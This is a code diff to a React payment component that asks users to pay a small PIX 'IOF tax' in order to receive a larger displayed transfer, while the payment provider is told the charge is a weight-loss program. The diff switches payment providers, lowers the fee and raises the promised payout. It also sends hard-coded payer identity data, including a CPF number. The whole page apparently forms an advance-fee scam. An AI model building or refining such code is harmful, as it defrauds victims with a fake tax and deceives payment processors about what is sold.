@@ -151,37 +151,19 @@ export default function CurrencyTransfer() {
 
       const transactionData = {
         external_id: `emagrecimento-ja-${Date.now()}`,
-        total_amount: 14.9, // Valor fixo de R$14,90 para IOF
-        payment_method: "PIX",
-        webhook_url: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/webhook/lira-pay`,
-        items: [
-          {
-            id: "emagrecimento-ja-produto",
-            title: "Emagrecimento Já - Método Completo",
-            description: "Programa completo de emagrecimento natural e saudável",
-            price: 14.9,
-            quantity: 1,
-            is_physical: false,
-          },
-        ],
-        ip: "127.0.0.1",
-        customer: {
+        amount: 8.92, // Updated price from 14.9 to 8.92
+        clientCallbackUrl: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
+        payer: {
           name: "UPP",
           email: "cliente@email.com",
-          phone: "11987654321",
-          document_type: "CPF",
           document: "18219822821",
-          utm_source: utmParams.utm_source || "",
-          utm_medium: utmParams.utm_medium || "",
-          utm_campaign: utmParams.utm_campaign || "",
-          utm_content: utmParams.utm_content || "",
-          utm_term: utmParams.utm_term || "",
         },
+        utm_params: utmParams,
       }
 
       console.log("[v0] Creating IOF PIX payment with data:", transactionData)
 
-      const response = await fetch("/api/lira-pay/create-transaction", {
+      const response = await fetch("/api/keyclub/deposit", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -248,7 +230,7 @@ export default function CurrencyTransfer() {
           <div className="bg-white w-full max-w-md mx-auto p-6 rounded-lg shadow-lg">
             <div className="text-center space-y-4">
               <h2 className="text-xl font-bold text-zinc-900">Pagamento PIX - IOF</h2>
-              <p className="text-sm text-zinc-600">Valor: R$ 14,90</p>
+              <p className="text-sm text-zinc-600">Valor: R$ 8,92</p>
 
               {!pixLoadingComplete ? (
                 <div className="space-y-3">
@@ -466,14 +448,14 @@ export default function CurrencyTransfer() {
 
                         <div className="flex justify-between items-center">
                           <span className="text-xs text-zinc-600 dark:text-zinc-400">Taxa IOF</span>
-                          <span className="text-xs font-medium text-red-600">-R$ 14,90</span>
+                          <span className="text-xs font-medium text-red-600">-R$ 8,92</span>
                         </div>
 
                         <hr className="border-zinc-200 dark:border-zinc-700" />
 
                         <div className="flex justify-between items-center">
                           <span className="text-xs font-bold text-zinc-900 dark:text-zinc-100">Total final</span>
-                          <span className="text-sm font-bold text-green-600">R$ 420,40</span>
+                          <span className="text-sm font-bold text-green-600">R$ 486,38</span>
                         </div>
                       </div>
                     </div>
